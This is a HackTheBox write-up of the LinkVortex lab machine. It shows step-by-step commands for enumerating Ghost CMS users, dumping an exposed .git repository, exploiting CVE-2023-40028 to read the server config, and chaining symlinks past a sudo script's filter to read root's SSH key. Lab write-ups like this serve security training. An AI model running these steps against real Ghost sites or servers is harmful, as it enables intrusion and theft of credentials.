# HackTheBox — LinkVortex | Full Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Linux / Web
> **Date:** 2026-03-30

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Recon](#recon)
3. [Exposed .git Repository — dev Subdomain](#exposed-git-repository--dev-subdomain)
4. [Ghost CMS — CVE-2023-40028 (Arbitrary File Read)](#ghost-cms--cve-2023-40028-arbitrary-file-read)
5. [Initial Access — SSH as bob](#initial-access--ssh-as-bob)
6. [Privilege Escalation — sudo Symlink Script + CHECK_CONTENT Bypass](#privilege-escalation--sudo-symlink-script--check_content-bypass)
7. [Attack Chain](#attack-chain)
8. [Tools Used](#tools-used)
9. [Vulnerabilities Exploited](#vulnerabilities-exploited)
10. [What Failed — Dead Ends](#what-failed--dead-ends)
11. [Key Takeaways](#key-takeaways)

---

## TL;DR

LinkVortex is an Easy Linux box running Ghost CMS 5.58. A virtual host subdomain (`dev.linkvortex.htb`) exposed a `.git` repository. Dumping it with `git-dumper` and diffing against the upstream Ghost source revealed a hardcoded credential in a modified test file. With Ghost admin access, CVE-2023-40028 (authenticated arbitrary file read via symlink in theme upload) was used to read the production config and obtain SSH credentials. On the box, a sudo rule allowed running a symlink-cleanup script with a preserved environment variable (`CHECK_CONTENT`) that enabled file content output. The script's string filter (`grep -Eq '(etc|root)'`) was bypassed using a double symlink chain routed through a directory named `r00t`, leaking root's SSH private key and granting full root access.

---

## Recon

### Port Scan

```bash
nmap -sV -sC -T4 --open 10.129.231.194
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Thought process:** Minimal attack surface — SSH and HTTP only. HTTP with `X-Powered-By: Express` in responses suggests a Node.js backend behind Apache. Ghost CMS was immediately identifiable from HTML meta tags (Casper theme, `@ghost` Twitter, `article:publisher` pointing to Ghost). Version confirmed via the Ghost admin API.

### Web Enumeration

Browsed to `http://linkvortex.htb` — Ghost CMS blog called "BitByBit Hardware". Checked the Ghost admin API:

```bash
curl -s http://linkvortex.htb/ghost/api/admin/site/ | python3 -m json.tool
```

```json
{"site": {"version": "5.58"}}
```

Ghost 5.58 is vulnerable to **CVE-2023-40028** (arbitrary file read) — requires authentication.

Confirmed a valid admin email by observing the difference in API error responses:

```bash
# 422 = user exists, wrong password
curl -s -X POST http://linkvortex.htb/ghost/api/admin/session/ \
  -H "Content-Type: application/json" -H "Origin: http://linkvortex.htb" \
  -d '{"username":"admin@linkvortex.htb","password":"wrongpass"}'

# 404 = no such user
curl -s -X POST http://linkvortex.htb/ghost/api/admin/session/ \
  -H "Content-Type: application/json" -H "Origin: http://linkvortex.htb" \
  -d '{"username":"nobody@linkvortex.htb","password":"wrongpass"}'
```

| Path | Content |
| --- | --- |
| `/` | Ghost CMS — BitByBit Hardware (hardware blog) |
| `/ghost/` | Ghost Admin login panel |
| `/ghost/api/admin/site/` | Ghost version 5.58 |
| `/robots.txt` | Disallows /ghost/, /p/, /email/, /r/ |
| `/sitemap-authors.xml` | Single author: `admin@linkvortex.htb` |

**Thought process:** Username confirmed, password unknown. Standard wordlists failed (all returned 422). Moved to virtual host fuzzing since Ghost installs often have dev/staging environments.

### Vhost Enumeration

Used a size-based curl loop to quickly identify unique virtual hosts:

```bash
for sub in dev git api staging test beta backup src code admin; do
  size=$(curl -s -w "%{size_download}" -o /dev/null \
    -H "Host: $sub.linkvortex.htb" http://10.129.231.194/)
  [[ $size != "12148" ]] && echo "HIT: $sub.linkvortex.htb ($size bytes)"
done
```

```
HIT: dev.linkvortex.htb (2538 bytes)
HIT: git.linkvortex.htb (230 bytes)
HIT: api.linkvortex.htb (230 bytes)
...
```

**Key finding:** `dev.linkvortex.htb` returned a unique 2538-byte response — a "Launching Soon" placeholder page. All others returned 230 bytes (generic 404). Added to `/etc/hosts`.

---

## Exposed .git Repository — dev Subdomain

### Discovery

```bash
curl -s http://dev.linkvortex.htb/.git/HEAD
# 299cdb4387763f850887275a716153e84793077d

curl -s http://dev.linkvortex.htb/.git/config
```

```
[remote "origin"]
    url = https://github.com/TryGhost/Ghost.git
    fetch = +refs/tags/v5.58.0:refs/tags/v5.58.0
```

**Thought process:** A real commit hash returned from `.git/HEAD` confirms the repo is exposed. The config shows it tracks Ghost v5.58.0 from upstream — any HTB-specific customizations will appear as diffs from that tag.

### Dumping the Repository

```bash
cd ~/hackthebox/machine/linkvortex
python3 -m venv venv && source venv/bin/activate
pip install git-dumper
git-dumper http://dev.linkvortex.htb/.git ./git-dump
```

### Finding the Credential

```bash
cd git-dump
git status
```

```
Changes to be committed:
  new file:   Dockerfile.ghost
  modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

```bash
git diff HEAD ghost/core/test/regression/api/admin/authentication.test.js
```

```diff
-            const password = 'thisissupersafe';
+            const password = '<REDACTED>';
```

**Key finding:** The test file was modified from the stock Ghost placeholder password. The new password had been substituted in — a classic HTB pattern where real credentials are embedded into test files committed to the repo.

---

## Ghost CMS — CVE-2023-40028 (Arbitrary File Read)

### The Vulnerability

Ghost CMS versions prior to 5.59.1 allow authenticated users to upload theme zip files. The theme extraction process does not sanitize symlinks — if a zip contains a symlink, Ghost extracts and follows it when serving theme assets, enabling arbitrary file reads from the filesystem as the Ghost process user.

### Authentication

```bash
curl -s -X POST http://linkvortex.htb/ghost/api/admin/session/ \
  -H "Content-Type: application/json" \
  -H "Origin: http://linkvortex.htb" \
  -c cookies.txt \
  -d '{"username":"admin@linkvortex.htb","password":"<REDACTED>"}'
# HTTP/1.1 201 Created
```

### Exploitation

Used the public PoC by 0xDTC:

```bash
git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
cd Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
chmod +x CVE-2023-40028
./CVE-2023-40028 -u admin@linkvortex.htb -p <REDACTED> -h http://linkvortex.htb
```

The PoC drops into an interactive shell. Read the Ghost production config:

```
Enter the file path to read: /var/lib/ghost/config.production.json
```

```json
"mail": {
  "transport": "SMTP",
  "options": {
    "service": "Google",
    "host": "linkvortex.htb",
    "port": 587,
    "auth": {
      "user": "bob@linkvortex.htb",
      "pass": "<REDACTED>"
    }
  }
}
```

**Key finding:** Ghost SMTP credentials stored in plaintext in the production config. These credentials are reused for SSH.

**Why it works:** The PoC creates a zip containing a symlink, uploads it as a Ghost theme, activates it, then fetches the symlinked file through Ghost's theme asset serving endpoint. Ghost follows the symlink as the process user, returning the file contents.

---

## Initial Access — SSH as bob

```bash
ssh bob@linkvortex.htb
# Password: <REDACTED>
```

Shell as `bob`. Checked sudo rights immediately:

```bash
sudo -l
```

```
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=..., use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

**Thought process:** Two signals: (1) a sudo rule on a script that processes `.png` files, (2) `env_keep+=CHECK_CONTENT` — the preserved environment variable controls script behavior. Always read the script before doing anything else.

---

## Privilege Escalation — sudo Symlink Script + CHECK_CONTENT Bypass

### The Script

```bash
cat /opt/ghost/clean_symlink.sh
```

```bash
#!/bin/bash
QUAR_DIR="/var/quarantined"
if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi
LINK=$1
if ! [[ "$LINK" =~ \.png$ ]]; then
  echo "! First argument must be a png file !"
  exit 2
fi
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    echo "! Trying to read critical files, removing link !"
    /usr/bin/unlink $LINK
  else
    echo "Link found, moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

### The Vulnerability

The script:
1. Checks if the `.png` argument is a symlink
2. Reads its **direct** target using `readlink` (one level — not `readlink -f`)
3. Filters targets containing the strings `etc` or `root`
4. If the filter passes — moves to `/var/quarantined/` and if `CHECK_CONTENT=true`, runs `cat` on the quarantined file **as root** (the entire script runs under sudo)

The key weaknesses:
- `readlink` without `-f` only resolves **one hop** — so if the `.png` points to an intermediate symlink, only the intermediate's path is checked against the filter
- `cat` follows the **full symlink chain** — resolving all hops
- The string filter checks for literal `root` and `etc` — easily bypassed with alternative spellings

### The Bypass — Double Symlink via r00t Directory

```
/tmp/key2.png  →  /tmp/r00t/key.txt  →  /root/.ssh/id_rsa
```

- `readlink /tmp/key2.png` returns `/tmp/r00t/key.txt` — no `root` or `etc` → passes filter
- Script moves `/tmp/key2.png` to `/var/quarantined/key2.png`
- `cat /var/quarantined/key2.png` follows: `/tmp/r00t/key.txt` → `/root/.ssh/id_rsa` → **reads key as root**

```bash
# Step 1 — create r00t directory (avoids 'root' string match)
mkdir -p /tmp/r00t

# Step 2 — intermediate symlink pointing to root's SSH key
ln -s /root/.ssh/id_rsa /tmp/r00t/key.txt

# Step 3 — .png symlink pointing to the intermediate
ln -s /tmp/r00t/key.txt /tmp/key2.png

# Verify the one-hop readlink output (must not contain 'root' or 'etc')
readlink /tmp/key2.png
# /tmp/r00t/key.txt ✅

# Step 4 — run with CHECK_CONTENT=true
export CHECK_CONTENT=true
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/key2.png
```

```
Link found [ /tmp/key2.png ] , moving it to quarantine
Content:
[root SSH private key printed here]
```

**Why it works:** `readlink` (without `-f`) is not recursive — it returns the literal value stored in the symlink, not the final resolved path. The grep filter only sees `/tmp/r00t/key.txt`. When `cat` runs as root, it follows the full chain through the filesystem, reading the final target regardless of intermediate paths.

### Root Access

```bash
# On attacker machine — save the key, set permissions, connect
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@linkvortex.htb
```

```bash
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)

root@linkvortex:~# cat /root/root.txt
<REDACTED>
```

---

## Attack Chain

```
nmap → Port 22 (SSH), Port 80 (Apache + Express)
│
└── Port 80 — Ghost CMS 5.58
    │
    ├── Ghost API → admin@linkvortex.htb confirmed (422 vs 404)
    │
    ├── Vhost fuzz → dev.linkvortex.htb (unique response size)
    │   └── dev.linkvortex.htb/.git exposed
    │       └── git-dumper → git diff HEAD
    │           └── authentication.test.js modified → admin password leaked
    │
    ├── Ghost admin login → 201 Created
    │   └── CVE-2023-40028 (authenticated LFI via symlink theme upload)
    │       └── Read /var/lib/ghost/config.production.json
    │           └── SMTP creds → SSH creds for bob
    │
    └── SSH as bob → user.txt ✅
        └── sudo -l → clean_symlink.sh + env_keep+=CHECK_CONTENT
            └── Script uses readlink (1 hop) for filter, cat (full chain) for output
                └── Double symlink via /tmp/r00t/ bypasses grep '(etc|root)'
                    └── Root SSH private key leaked via CHECK_CONTENT=true
                        └── SSH as root → root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service detection |
| `curl` | Manual HTTP enumeration and Ghost API interaction |
| `ffuf` / manual vhost loop | Virtual host discovery |
| `git-dumper` | Dump exposed .git repository |
| `git diff` | Identify modifications from upstream Ghost source |
| `CVE-2023-40028 PoC (0xDTC)` | Authenticated arbitrary file read on Ghost 5.58 |
| `ln` | Symlink construction for privesc |
| `ssh` | Initial access and root access |

---

## Vulnerabilities Exploited

| Vulnerability | Location | Impact |
| --- | --- | --- |
| Exposed .git repository | `dev.linkvortex.htb/.git` | Full source code disclosure |
| Hardcoded credential in test file | `authentication.test.js` (git diff) | Ghost admin access |
| CVE-2023-40028 | Ghost 5.58 — theme upload symlink LFI | Arbitrary file read as Ghost process |
| Plaintext credentials in Ghost config | `/var/lib/ghost/config.production.json` | SSH access as `bob` |
| sudo clean_symlink.sh + CHECK_CONTENT | `/opt/ghost/clean_symlink.sh` | File read as root via symlink |
| String filter bypass (`r00t` vs `root`) | `grep -Eq '(etc\|root)'` on `readlink` output | Bypass filter to read /root files |

---

## What Failed — Dead Ends

| Approach | Why It Failed |
| --- | --- |
| CVE-2021-41773 (Apache path traversal) | Server returned 301 redirect — backend is Express/Ghost, not vulnerable Apache |
| Password spray with common wordlists | All returned 422 — correct username, password not in standard lists |
| CVE-2023-40028 to read `/root/root.txt` | Ghost process can't access files outside its content path — returns 404 HTML |
| Single-level symlink (`exploit.png → /root/ssh_key`) | Direct target contains `root` — caught by grep filter, symlink deleted |
| Double symlink via `/tmp/root/` path | Intermediate path contains literal string `root` — still caught by grep filter |
| Stale quarantine entries from earlier attempts | Old symlinks in `/var/quarantined/` with broken `/tmp` intermediates — cleanup required before retry |

---

## Key Takeaways

**1. Vhost enumeration is a first-class recon step**
When credentials are unknown and password spray fails, virtual host fuzzing often reveals dev/staging subdomains with exposed source code or configuration. A size-based curl loop against a short wordlist gives instant signal before running full ffuf scans.

**2. git diff against upstream reveals HTB customizations instantly**
After `git-dumper`, running `git status` and `git diff HEAD` highlights every file changed from the original upstream source. Test files (`authentication.test.js`, `setup-test.js`) are a common hiding spot for real credentials on HTB machines.

**3. env_keep in sudoers is always a signal — read the script**
When `env_keep+=VAR` appears in a sudo rule, the preserved variable drives some conditional logic in the target script. Setting it before running sudo can unlock hidden code paths. Always `cat` the script before attempting any exploit.

**4. readlink vs readlink -f — the depth difference matters**
`readlink` resolves one hop. `readlink -f` resolves the full chain. Scripts that filter symlink targets using `readlink` (one hop) are vulnerable to double-symlink chains where the intermediate path passes the filter but the final resolved path does not.

**5. String filters are bypassable with alternative spellings**
Filters checking for literal strings like `root` or `etc` can be bypassed with leet-speak (`r00t`, `3tc`) or other path constructions that resolve to the same directory but don't match the grep pattern. Always check what the filter is actually matching against.

---

*Written by k41r0s3 | HackTheBox | LinkVortex | Easy*
